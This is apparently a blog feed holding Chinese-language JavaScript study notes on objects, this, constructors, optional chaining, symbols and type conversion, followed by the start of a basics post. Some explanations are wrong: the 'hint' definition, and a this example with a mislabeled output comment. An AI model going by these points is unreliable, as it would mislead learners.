title="属性名简写"></a>属性名简写</h5><p>如果我们需要通过一个函数创建大量对象，可以这样写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeUser</span>(<span class="params">name,age</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        name, <span class="comment">// 与 name: name 相同</span></span><br><span class="line">        age,  <span class="comment">// 与 age: age 相同</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">user1 = <span class="title function_">makeUser</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line">user2 = <span class="title function_">makeUser</span>(<span class="string">&quot;Pete&quot;</span>, <span class="number">35</span>);</span><br><span class="line">user3 = <span class="title function_">makeUser</span>(<span class="string">&quot;Randolfluo&quot;</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure><h5 id="属性存在性测试，in操作符"><a href="#属性存在性测试，in操作符" class="headerlink" title="属性存在性测试，in操作符"></a>属性存在性测试，in操作符</h5><p>我们想访问一个属性的值，那么只有该属性存在我们的访问才有意义。</p><p>可以通过<code>in</code>来判断该属性是否存在.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>( <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> user );    <span class="comment">// true</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="string">&quot;country&quot;</span> <span class="keyword">in</span> user );     <span class="comment">//false</span></span><br></pre></td></tr></table></figure><h5 id="“for-in”循环"><a href="#“for-in”循环" class="headerlink" title="“for..in”循环"></a>“for..in”循环</h5><p>可以通过<code>“for..in”循环</code>遍历对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> user)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(key);</span><br><span class="line">    <span class="title function_">alert</span>(user[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="像对象一样排序"><a href="#像对象一样排序" class="headerlink" title="像对象一样排序"></a>像对象一样排序</h5><p>获取属性的顺序为:整数属性会被进行排序，其他属性则按照创建的顺序显示。</p><h4 id="4-2-对象引用和复制"><a href="#4-2-对象引用和复制" class="headerlink" title="4.2 对象引用和复制"></a>4.2 对象引用和复制</h4><h6 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h6><p>当一个对象变量被复制 —— 引用被复制，而该对象自身并没有被复制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123; <span class="attr">name</span>: <span class="string">&quot;Randolfluo&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> admin = user; <span class="comment">// 复制引用</span></span><br><span class="line">admin.<span class="property">name</span> = <span class="string">&quot;God&quot;</span>;</span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">name</span>);   <span class="comment">// God</span></span><br><span class="line"><span class="title function_">alert</span>(admin.<span class="property">name</span>);  <span class="comment">// God</span></span><br></pre></td></tr></table></figure><p>使用 const 声明的对象也是可以被修改的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;John&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//user = ...作为整体时才会报错。</span></span><br><span class="line">user.<span class="property">name</span> = <span class="string">&quot;Pete&quot;</span>; <span class="comment">// (*)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">name</span>); <span class="comment">// Pete使用 const 声明的对象也是可以被修改的</span></span><br></pre></td></tr></table></figure><h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p>使用for…in复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> user) &#123;</span><br><span class="line">  clone[key] = user[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用assign复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> clone = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, user);</span><br></pre></td></tr></table></figure><p>assign还可以逐个添加不同对象属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> permissions1 = &#123;...&#125;;</span><br><span class="line"><span class="keyword">let</span> permissions2 = &#123;...&#125;;                </span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(user, permissions1, permissions2);</span><br></pre></td></tr></table></figure><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p><a href="https://zh.javascript.info/garbage-collection">垃圾回收 (javascript.info)</a></p><h4 id="4-4-对象方法，”this”"><a href="#4-4-对象方法，”this”" class="headerlink" title="4.4 对象方法，”this”"></a>4.4 对象方法，”this”</h4><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个包含一个方法的对象</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    <span class="title function_">sayHi3</span> ()&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Hello from sayHi3&quot;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 定义一个独立的函数,并将该函数加入对象中</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Hello from sayHi1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">user.<span class="property">sayHi1</span> = sayHi1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接定义并添加一个匿名函数作为对象的属性</span></span><br><span class="line">user.<span class="property">sayHi2</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Hello from sayHi2&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">user.<span class="title function_">sayHi1</span>();</span><br><span class="line">user.<span class="title function_">sayHi2</span>();</span><br><span class="line">user.<span class="title function_">sayHi3</span>();</span><br></pre></td></tr></table></figure><h5 id="方法中的this"><a href="#方法中的this" class="headerlink" title="方法中的this"></a>方法中的this</h5><p>有时候我们需要修改对象的属性，当对象名被修改后我们就无法使用<code>属性.变量</code>,来访问他，我们可以使用this解决这一问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>( <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不要忘记这样是使user1指向user所指向的对象，因此输出一样</span></span><br><span class="line"><span class="keyword">let</span> user1 = user;</span><br><span class="line">user1.<span class="property">name</span> = <span class="string">&quot;Dick&quot;</span>;</span><br><span class="line">user.<span class="property">print</span> = print; </span><br><span class="line">user.<span class="title function_">print</span>();   <span class="comment">//Dick</span></span><br><span class="line">user1.<span class="property">print</span> = print;   </span><br><span class="line">user1.<span class="title function_">print</span>();   <span class="comment">//Dick</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//我们可以通过this使得不同对象调用同一函数</span></span><br><span class="line"><span class="keyword">let</span> user2 = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">user2.<span class="property">name</span> = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line">user.<span class="property">print</span> = print; <span class="comment">//Dick</span></span><br><span class="line">user.<span class="title function_">print</span>();</span><br><span class="line">user2.<span class="property">print</span> = print;    <span class="comment">//Dick</span></span><br><span class="line">user2.<span class="title function_">print</span>();</span><br></pre></td></tr></table></figure><h4 id="4-5-构造器和操作符-“new”"><a href="#4-5-构造器和操作符-“new”" class="headerlink" title="4.5 构造器和操作符 “new”"></a>4.5 构造器和操作符 “new”</h4><p>构造函数</p><ol><li>它们的命名以大写字母开头。</li><li>它们只能由 <code>&quot;new&quot;</code> 操作符来执行。</li><li>用于实现可重用的对象创建代码。</li><li>在开始时创建了空的 <code>this</code>，并在最后返回填充了值的 <code>this</code>。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">print</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">age</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Ran</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Randolfluo&quot;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Dick</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Dick&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ran</span>.<span class="title function_">print</span>();      <span class="comment">//Randolfluo 20</span></span><br><span class="line"><span class="title class_">Dick</span>.<span class="title function_">print</span>();     <span class="comment">//Dick 18</span></span><br></pre></td></tr></table></figure><h4 id="4-6-可选链-“-”"><a href="#4-6-可选链-“-”" class="headerlink" title="4.6 可选链 “?.”"></a>4.6 可选链 “?.”</h4><ul><li>用于解决访问“不存在的属性”的报错的问题</li><li><code>?.</code> 链使我们能够安全地访问嵌套属性。</li><li>如果 <code>?.</code> 左边部分不存在，就会立即停止运算（“短路效应”）。</li></ul><h5 id="访问可能不存在的属性"><a href="#访问可能不存在的属性" class="headerlink" title="访问可能不存在的属性"></a>访问可能不存在的属性</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    name : <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    age : <span class="number">20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">address</span>.<span class="property">name</span>);   <span class="comment">//error</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意usr.address只会显示undefined，</span></span><br><span class="line"><span class="comment">即我们访问undefined对象的元素才会报错</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user?.<span class="property">address</span>?.<span class="property">name</span>);   <span class="comment">//undefined </span></span><br><span class="line"><span class="comment">//短路效应，不会访问到name</span></span><br></pre></td></tr></table></figure><h5 id="和"><a href="#和" class="headerlink" title="?.()和?.[]"></a>?.()和?.[]</h5><p><strong>可以使用 <code>?.</code> 来安全地读取或删除，但不能写入</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user1 = &#123;</span><br><span class="line">    <span class="string">&quot;first name&quot;</span> : <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">user1.<span class="property">sayHello</span>?.();     <span class="comment">//输出Hello</span></span><br><span class="line">user2.<span class="property">sayHello</span>?.();     <span class="comment">//无输出</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user1?.[<span class="string">&quot;first name&quot;</span>]);   <span class="comment">//输出Randolfluo</span></span><br><span class="line"><span class="title function_">alert</span>(user2?.[<span class="string">&quot;first name&quot;</span>]);   <span class="comment">//输出undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实现安全删除</span></span><br><span class="line"><span class="keyword">delete</span> user1?.<span class="property">sayHello</span>;</span><br><span class="line"><span class="comment">//使用 delete 操作符删除对象的方法时，不能加上括号，因为加上括号会调用该方法，而不是删除它。我们应该只删除方法的引用，而不是调用方法。</span></span><br><span class="line"><span class="keyword">delete</span> user1?.[<span class="string">&quot;first name&quot;</span>];</span><br><span class="line">user1.<span class="property">sayHello</span>?.();     <span class="comment">//无输出</span></span><br><span class="line"><span class="title function_">alert</span>(user1?.[<span class="string">&quot;first name&quot;</span>]);   <span class="comment">//undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不能写入</span></span><br><span class="line">user1?.[<span class="string">&quot;first name&quot;</span>] = <span class="string">&quot;Randolfluo&quot;</span>;</span><br><span class="line"><span class="comment">//Error  Invalid left-hand side in assignment</span></span><br></pre></td></tr></table></figure><h4 id="4-7-symbol"><a href="#4-7-symbol" class="headerlink" title="4.7 symbol"></a>4.7 symbol</h4><h5 id="什么是symbol"><a href="#什么是symbol" class="headerlink" title="什么是symbol"></a>什么是symbol</h5><ul><li>symbol是<code>全局唯一</code>的，但是它们的可访问性取决于该模块是否拥有该<code>实例</code>，如（另一个js文件如果没有从此js文件导入id1和id2，则无法访问这个symbol实例。</li><li>symbol 不会被自动转换为字符串，我们可以使用<code>toString()</code>和<code>description</code>来输出symbol的描述。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> id1 = <span class="title class_">Symbol</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> id2 = <span class="title class_">Symbol</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(id1 == id2); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出symbol的描述</span></span><br><span class="line"><span class="title function_">alert</span>(id1.<span class="title function_">toString</span>());      <span class="comment">//symbol(id)</span></span><br><span class="line"><span class="title function_">alert</span>(id2.<span class="property">description</span>);     <span class="comment">//id</span></span><br></pre></td></tr></table></figure><h5 id="通过symbol隐藏属性"><a href="#通过symbol隐藏属性" class="headerlink" title="通过symbol隐藏属性"></a>通过symbol隐藏属性</h5><ul><li><p>可以看到我们在没有持有<code>symbol</code>的情况无法修改<code>user[id]</code>，实现了属性的隐藏。</p></li><li><p>symbol 属性不参与 <code>for..in</code> 循环。</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="title class_">Symbol</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">    [id] : <span class="number">114514</span>,  <span class="comment">//需要变量 id 的值作为键，而不是字符串 “id”</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span>.<span class="property">id</span> = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">User</span>[id]);    <span class="comment">//114514</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">User</span>.<span class="property">id</span>);     <span class="comment">//12345</span></span><br></pre></td></tr></table></figure><h5 id="全局-symbol-注册表"><a href="#全局-symbol-注册表" class="headerlink" title="全局 symbol 注册表"></a>全局 symbol 注册表</h5><ul><li>我们可以在其中创建 symbol 并在稍后访问它们，它可以确保每次访问相同名字的 symbol 时，返回的都是相同的 symbol。</li><li><code>Symbol.for(key)</code> 按描述返回一个 symbol。</li><li><code>Symbol.keyFor(sym)</code>，通过全局 symbol 返回一个名字</li></ul><h4 id="4-8-对象-——-原始值转换"><a href="#4-8-对象-——-原始值转换" class="headerlink" title="4.8 对象 —— 原始值转换"></a>4.8 对象 —— 原始值转换</h4><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><ul><li>在JavaScript中，类型转换的<code>“hint”</code>通常指的是在使用<code>typeof</code>、<code>instanceof</code>、<code>in</code>等操作符时，或者在进行比较操作时，JavaScript引擎是如何解释操作数的。</li></ul><h5 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h5><p>如果 <code>Symbol.toPrimitive</code> 方法存在，则它会被用于所有 hint</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">money</span>: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">  [<span class="title class_">Symbol</span>.<span class="property">toPrimitive</span>](hint) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`hint: <span class="subst">$&#123;hint&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> hint == <span class="string">&quot;string&quot;</span> ? <span class="string">`&#123;name: &quot;<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>&quot;&#125;`</span> : <span class="variable language_">this</span>.<span class="property">money</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换演示：</span></span><br><span class="line"><span class="title function_">alert</span>(user); <span class="comment">// hint: string -&gt; &#123;name: &quot;John&quot;&#125;</span></span><br><span class="line"><span class="title function_">alert</span>(+user); <span class="comment">// hint: number -&gt; 1000</span></span><br><span class="line"><span class="title function_">alert</span>(user + <span class="number">500</span>); <span class="comment">// hint: default -&gt; 1500</span></span><br></pre></td></tr></table></figure><h5 id="toString和-valueOf"><a href="#toString和-valueOf" class="headerlink" title="toString和 valueOf"></a>toString和 valueOf</h5><p>如果没有 <code>Symbol.toPrimitive</code>，那么 JavaScript 将尝试寻找 <code>toString</code> 和 <code>valueOf</code> 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">money</span>: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对于 hint=&quot;string&quot;</span></span><br><span class="line">  <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&#123;name: &quot;<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>&quot;&#125;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对于 hint=&quot;number&quot; 或 &quot;default&quot;</span></span><br><span class="line">  <span class="title function_">valueOf</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">money</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user); <span class="comment">// toString -&gt; &#123;name: &quot;John&quot;&#125;</span></span><br><span class="line"><span class="title function_">alert</span>(+user); <span class="comment">// valueOf -&gt; 1000</span></span><br><span class="line"><span class="title function_">alert</span>(user + <span class="number">500</span>); <span class="comment">// valueOf -&gt; 1500</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习记录0x1</title>
      <link href="/2024/05/24/js/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/05/24/js/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><p>[toc]</p><p><strong>ECMAScript</strong>是 <strong>JavaScript</strong> 的标准规范。</p><p>主要记录下学习记录和<code>javascript</code>相较于<code>C和cpp</code>的差异和特性</p><p>跟着<a href="https://zh.javascript.info/">现代 JavaScript 教程</a>一起学！</p><h4 id="2-1-HelloWorld"><a href="#2-1-HelloWorld" class="headerlink" title="2.1 HelloWorld"></a>2.1 HelloWorld</h4><p>我们可以直接在<code>html</code>里面嵌入<code>js脚本</code>，也可以引用相对路径的<code>js文件</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span>    <span class="comment">&lt;!-- HTML5 Document Type --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>   <span class="comment">&lt;!-- html文件根元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 直接在html界面嵌入js脚本 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;Randolfluo&quot;</span>);    </span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 引入js脚本 --&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">&quot;Randolfluo.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-代码结构"><a href="#2-2-代码结构" class="headerlink" title="2.2 代码结构"></a>2.2 代码结构</h4><ul><li><p><code>javascript</code>有<a href="https://tc39.github.io/ecma262/#sec-automatic-semicolon-insertion">自动分号插入</a>，但是我们最好还是自己加上分号。一是为了使代码结构清晰，二是避免一些因自动分号插入而导致的隐蔽错误。</p></li><li><p>注释与C和cpp一样</p></li></ul><h4 id="2-3-现代模式，”use-strict”"><a href="#2-3-现代模式，”use-strict”" class="headerlink" title="2.3 现代模式，”use strict”"></a>2.3 现代模式，”use strict”</h4><p>​    请——-将她写在脚本文件顶部</p><h4 id="2-4-变量"><a href="#2-4-变量" class="headerlink" title="2.4 变量"></a>2.4 变量</h4><ul><li>使用<code>let</code>声明变量，使用<code>const</code>声明常量</li><li>区分大小写</li><li>“硬编码”类型（不会随代码执行改变）使用大写常量命名。具有一定可变性的常量使用小写命名</li></ul><h4 id="2-5-数据类型"><a href="#2-5-数据类型" class="headerlink" title="2.5 数据类型"></a>2.5 数据类型</h4><p>通过 <code>typeof</code> 运算符查看存储在变量中的数据类型。</p><h5 id="Number类型"><a href="#Number类型" class="headerlink" title="Number类型"></a>Number类型</h5><ul><li><code>infinity</code> 代表数学概念中的 <a href="https://en.wikipedia.org/wiki/Infinity">无穷大</a> ∞。是一个比任何数字都大的特殊值。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>( <span class="number">1</span> / <span class="number">0</span> ); <span class="comment">// Infinity</span></span><br><span class="line"><span class="title 